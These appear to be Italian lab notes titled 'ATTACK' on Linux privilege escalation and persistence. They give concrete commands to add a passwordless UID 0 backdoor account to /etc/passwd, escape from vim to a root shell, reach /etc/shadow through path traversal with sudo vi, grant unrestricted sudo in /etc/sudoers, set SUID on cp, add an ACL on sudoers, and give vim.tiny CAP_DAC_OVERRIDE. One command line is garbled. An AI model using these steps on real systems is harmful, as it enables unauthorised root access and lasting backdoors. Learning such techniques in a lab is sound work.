# ATTACK =================================================================================

1. Utilizzo di tee per aggiungere su /etc/passwd un utente con accesso privilegiato
(backdoor) che può fare login senza password, avrà UID e GID di root (0 entrambi), 
/root come home directory e /usr/bin/zsh come shell di login.

	hack::0:0:root:/root:/usr/bin/zsh

2. Utilizzo `openssl passwd` per generare l'hash della password `hack`


È anche possibile, tramite vim, eseguire comandi direttamente al suo interno con :!
Possiamo quindi aprire una shell di root con 

	:!/bin/bash
	
Se vim è limitato a un file, faccio path traversal

	sudo /usr/bin/vi /var/www/html/../../../etc/shadow


2. Si potrebbe anche non aggiungere utenti ma semplicemente settare l'id di un utente a 0, 
trasformandolo in un utente "root" che ha accesso illimitato al sistema e può eseguire qualsiasi operazione

3. L'utente "intruso" ha i permessi di scrittura con sudoers, il file che specifica quali operazioni un utente 
può fare con privilegi elevati (es. come root o altri utenti). Per diventare root basterà quindi diventare l'utente intruso 
(`su intruso`, non chiederà nessuna password come previsto), editare il file /etc/sudoers ed inserire questa riga

intruso ALL=(ALL:ALL) ALL

In questo modo gli sto dicendo che, tramite sudo, "intruso", da QUALSIASI HOST potrà eseguire con i privilegi di QUALSIASI UTENTE
 QUALSIASI COMANDO. A questo punto, eseguendo il comando `sudo -i`, eseguiamo una shell con privilegi di root e 
lanciamo il comando id

4. Per settarmi "da solo" dei privilegi:

- Assegno il suid a cp

	chmod u+s /bin/cp
	ls -al /bin/cpcp /etc/passwd .

	Così potrò copiare il file /etc/shadow e modificarlo
	
	cat passwd > pass.rw    # Crea una copia leggibile/scrivibile
	cat shadow > shad.rw    # Stessa cosa per shad

- Assegno delle acl per dare lettura e scrittura di kali al file sudoers
	
	setfacl -m u:kali:rw /etc/sudoers
	
- Mi assegno una capability CAP_DAC_OVERRIDE, la capacità di ignorare i permessi di lettura/scrittura 
sui file, anche quelli di sistema protetti.
	
	sudo /usr/sbin/setcap "CAP_DAC_OVERRIDE=eip" /usr/bin/vim.tiny
